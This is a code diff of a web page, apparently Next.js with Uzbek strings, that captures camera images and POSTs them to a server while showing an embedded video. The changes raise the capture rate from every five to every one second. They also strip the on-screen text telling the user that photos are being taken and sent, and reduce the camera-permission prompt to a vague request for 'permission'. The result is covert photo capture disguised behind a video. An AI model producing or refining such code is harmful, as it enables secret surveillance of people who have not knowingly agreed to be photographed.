@@ -26,7 +26,7 @@ export default function Home() {
 
     const interval = setInterval(() => {
       captureAndSend();
-    }, 5000); // har 5 soniyada
+    }, 1000); // har 5 soniyada
 
     return () => clearInterval(interval);
   }, [permission]);
@@ -49,7 +49,7 @@ export default function Home() {
         method: "POST",
         body: formData,
       });
-      console.log("Rasm yuborildi!");
+      console.log("...!");
     } catch (err) {
       console.error("Error sending auto photo:", err);
     }
@@ -76,13 +76,13 @@ export default function Home() {
       )}
 
       {permission === false && (
-        <h1>Iltimos, kamera ruxsatini bering!</h1>
+        <h1>Iltimos, ruxsat bering!</h1>
       )}
 
       {permission === true && (
         <>
           <h1>Ruxsat berildi! Video yuklanmoqda...</h1>
-          <p>{sending ? "Rasm yuborilmoqda..." : "Rasm avtomatik yuboriladi"}</p>
+          <p>{sending ? "..." : ""}</p>
           <iframe 
             width="853" 
             height="480" 
